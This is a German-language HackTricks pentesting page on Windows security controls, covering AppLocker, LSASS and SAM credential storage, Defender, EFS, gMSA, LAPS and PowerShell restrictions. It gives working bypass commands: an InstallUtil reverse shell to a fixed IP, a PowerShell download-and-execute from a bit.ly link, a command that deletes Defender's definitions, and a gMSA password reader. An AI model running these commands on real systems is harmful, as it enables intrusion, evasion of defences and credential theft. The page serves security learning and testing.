# Windows Security Controls

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten Community-Tools** unterstützt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker-Richtlinie

Eine Anwendungs-Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, die auf einem System vorhanden sein und ausgeführt werden dürfen. Das Ziel besteht darin, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen Geschäftsanforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Anwendungs-Whitelisting-Lösung** und gibt Systemadministratoren die Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Es bietet **feine Kontrolle** über ausführbare Dateien, Skripte, Windows-Installationsdateien, DLLs, verpackte Apps und verpackte App-Installationsprogramme.\
Es ist üblich, dass Organisationen **cmd.exe und PowerShell.exe blockieren** und den Schreibzugriff auf bestimmte Verzeichnisse einschränken, **aber all dies kann umgangen werden**.

### Überprüfung

Überprüfen Sie, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:

```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Diese Registrierungspfad enthält die Konfigurationen und Richtlinien, die von AppLocker angewendet werden, und bietet eine Möglichkeit, den aktuellen Satz von Regeln zu überprüfen, die auf dem System durchgesetzt werden:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Umgehen

* Nützliche **Schreibgeschützte Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker das Ausführen von allem innerhalb von `C:\Windows\System32` oder `C:\Windows` zulässt, gibt es **schreibgeschützte Ordner**, die Sie verwenden können, um **dies zu umgehen**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

* Häufig **vertrauenswürdige** [**"LOLBAS's"**](https://lolbas-project.github.io/) Binärdateien können auch nützlich sein, um AppLocker zu umgehen.
* **Schlecht geschriebene Regeln könnten ebenfalls umgangen werden**
* Zum Beispiel, mit **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, können Sie einen **Ordner namens `allowed`** überall erstellen und er wird erlaubt sein.
* Organisationen konzentrieren sich oft darauf, die Ausführung der `%System32%\WindowsPowerShell\v1.0\powershell.exe` ausführbaren Datei zu blockieren, vergessen jedoch die **anderen** [**PowerShell-Ausführungsorte**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
* **DLL-Durchsetzung ist sehr selten aktiviert** aufgrund der zusätzlichen Belastung, die sie auf ein System legen kann, und der Menge an erforderlichen Tests, um sicherzustellen, dass nichts kaputt geht. Daher können **DLLs als Hintertüren verwendet werden, um AppLocker zu umgehen**.
* Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **PowerShell-Code in jedem Prozess auszuführen** und AppLocker zu umgehen. Weitere Informationen finden Sie unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Speicherung von Anmeldeinformationen

### Sicherheitskonten-Manager (SAM)

Lokale Anmeldeinformationen sind in dieser Datei vorhanden, die Passwörter sind gehasht.

### Lokale Sicherheitsbehörde (LSA) - LSASS

Die **Anmeldeinformationen** (gehasht) werden im **Speicher** dieses Subsystems für Single Sign-On-Zwecke **gespeichert**.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen...), **Authentifizierung**, **Zugriffstoken**...\
LSA wird überprüfen, ob die bereitgestellten Anmeldeinformationen in der **SAM**-Datei vorhanden sind (für eine lokale Anmeldung) und mit dem **Domänencontroller** kommunizieren, um einen Domänenbenutzer zu authentifizieren.

Die **Anmeldeinformationen** werden im **Prozess LSASS** gespeichert: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.

### LSA-Secrets

LSA könnte einige Anmeldeinformationen auf der Festplatte speichern:

* Passwort des Computerkontos des Active Directory (nicht erreichbarer Domänencontroller).
* Passwörter der Konten von Windows-Diensten
* Passwörter für geplante Aufgaben
* Weitere (Passwort von IIS-Anwendungen...)

### NTDS.dit

Es ist die Datenbank des Active Directory. Es ist nur auf Domänencontrollern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) ist ein Antivirus, der in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Er **blockiert** gängige Pentesting-Tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, diese Schutzmaßnahmen zu **umgehen**.

### Überprüfen

Um den **Status** des **Defenders** zu überprüfen, können Sie das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (überprüfen Sie den Wert von **`RealTimeProtectionEnabled`**, um zu wissen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Zur Enumeration könnten Sie auch ausführen:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Verschlüsseltes Dateisystem (EFS)

EFS sichert Dateien durch Verschlüsselung unter Verwendung eines **symmetrischen Schlüssels** namens **File Encryption Key (FEK)**. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und innerhalb des verschlüsselten Dateis $EFS **alternativen Datenstroms** gespeichert. Bei Bedarf zur Entschlüsselung wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Stream zu entschlüsseln. Weitere Details finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Szenarien für Entschlüsselung ohne Benutzerinitiierung** umfassen:

* Wenn Dateien oder Ordner auf ein nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table) verschoben werden, werden sie automatisch entschlüsselt.
* Verschlüsselte Dateien, die über das Netzwerk über das SMB/CIFS-Protokoll gesendet werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht einen **transparenten Zugriff** auf verschlüsselte Dateien für den Besitzer. Das einfache Ändern des Passworts des Besitzers und das Einloggen erlauben jedoch keine Entschlüsselung.

**Hauptpunkte**:

* EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt ist.
* Zur Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
* Die automatische Entschlüsselung erfolgt unter bestimmten Bedingungen, z. B. beim Kopieren auf FAT32 oder bei der Netzwerkübertragung.
* Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.

### EFS-Informationen überprüfen

Überprüfen Sie, ob ein **Benutzer** diesen **Dienst** verwendet hat, indem Sie prüfen, ob dieser Pfad existiert: `C:\users\<Benutzername>\appdata\roaming\Microsoft\Protect`

Überprüfen Sie, **wer** Zugriff auf die Datei hat, indem Sie `cipher /c \<Datei>` verwenden. Sie können auch `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** und **entschlüsseln**.

### Entschlüsselung von EFS-Dateien

#### Als Autoritätssystem

In diesem Fall muss der **Opferbenutzer** einen **Prozess** im Host ausführen. In diesem Fall können Sie mit einer `meterpreter`-Sitzung das Token des Benutzerprozesses übernehmen (`impersonate_token` von `incognito`). Oder Sie könnten einfach zu einem Prozess des Benutzers `migrieren`.

#### Kenntnis des Benutzerpassworts

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Gruppenverwaltete Dienstkonten (gMSA)

Microsoft hat **Gruppenverwaltete Dienstkonten (gMSA)** entwickelt, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu traditionellen Dienstkonten, bei denen häufig die Einstellung "**Kennwort läuft nie ab**" aktiviert ist, bieten gMSAs eine sicherere und verwaltbarere Lösung:

* **Automatisches Kennwortmanagement**: gMSAs verwenden ein komplexes, 240-Zeichen langes Kennwort, das sich automatisch gemäß der Domänen- oder Computerrichtlinie ändert. Dieser Prozess wird vom Key Distribution Service (KDC) von Microsoft verwaltet, was manuelle Kennwortaktualisierungen überflüssig macht.
* **Erhöhte Sicherheit**: Diese Konten sind immun gegen Sperren und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
* **Unterstützung mehrerer Hosts**: gMSAs können auf mehreren Hosts gemeinsam genutzt werden, was sie ideal für Dienste macht, die auf mehreren Servern ausgeführt werden.
* **Fähigkeit zur Ausführung geplanter Aufgaben**: Im Gegensatz zu verwalteten Dienstkonten unterstützen gMSAs die Ausführung geplanter Aufgaben.
* **Vereinfachtes SPN-Management**: Das System aktualisiert automatisch den Service Principal Name (SPN), wenn es Änderungen an den sAMaccount-Details oder dem DNS-Namen des Computers gibt, was das SPN-Management vereinfacht.

Die Kennwörter für gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und alle 30 Tage automatisch von den Domänencontrollern (DCs) zurückgesetzt. Dieses Kennwort, ein verschlüsseltes Datenblob namens [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern, auf denen die gMSAs installiert sind, abgerufen werden, was eine sichere Umgebung gewährleistet. Um auf diese Informationen zuzugreifen, ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit 'Versiegeln & Sichern' authentifiziert werden.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Sie können dieses Kennwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) auslesen.

```
/GMSAPasswordReader --AccountName jkohler
```

[**Weitere Informationen finden Sie in diesem Beitrag**](https://cube0x0.github.io/Relaying-for-gMSA/)

Überprüfen Sie auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) darüber, wie man einen **NTLM-Relay-Angriff** durchführt, um das **Passwort** von **gMSA** zu **lesen**.

## LAPS

Die **Local Administrator Password Solution (LAPS)**, die zum Download von [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) zur Verfügung steht, ermöglicht das Management von lokalen Administratorpasswörtern. Diese Passwörter, die **zufällig generiert**, einzigartig und **regelmäßig geändert** werden, werden zentral im Active Directory gespeichert. Der Zugriff auf diese Passwörter ist durch ACLs auf autorisierte Benutzer beschränkt. Mit ausreichenden Berechtigungen kann die Möglichkeit geboten werden, lokale Administratorpasswörter zu lesen.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sperrt viele der Funktionen**, die benötigt werden, um PowerShell effektiv zu nutzen, wie das Blockieren von COM-Objekten, das Zulassen nur genehmigter .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.

### **Überprüfen**

```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Umgehen

```powershell
#Easy bypass
Powershell -version 2
```

In der aktuellen Windows-Version funktioniert dieser Bypass nicht, aber Sie können **PSByPassCLM** verwenden.\
**Um es zu kompilieren, müssen Sie möglicherweise** **eine Referenz hinzufügen** -> _Durchsuchen_ -> _Durchsuchen_ -> fügen Sie `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzu und **ändern Sie das Projekt auf .Net4.5**.

#### Direkter Bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Umgekehrte Shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess auszuführen und den eingeschränkten Modus zu umgehen. Weitere Informationen finden Sie unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Hauptwege, um diese Richtlinie zu umgehen:

```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

## Sicherheitsunterstützungsschnittstelle (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür zuständig, das geeignete Protokoll für zwei Maschinen zu finden, die kommunizieren möchten. Die bevorzugte Methode hierfür ist Kerberos. Anschließend verhandelt die SSPI, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle werden als Security Support Provider (SSP) bezeichnet, befinden sich in Form einer DLL in jeder Windows-Maschine und beide Maschinen müssen dasselbe unterstützen, um kommunizieren zu können.

### Haupt-SSPs

* **Kerberos**: Der bevorzugte
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** und **NTLMv2**: Aus Gründen der Kompatibilität
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashes
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL und TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Wird verwendet, um das zu verwendende Protokoll zu verhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
* %windir%\Windows\System32\lsasrv.dll

#### Die Verhandlung könnte mehrere Methoden oder nur eine anbieten.

## UAC - Benutzerkontensteuerung

[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Heute noch Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
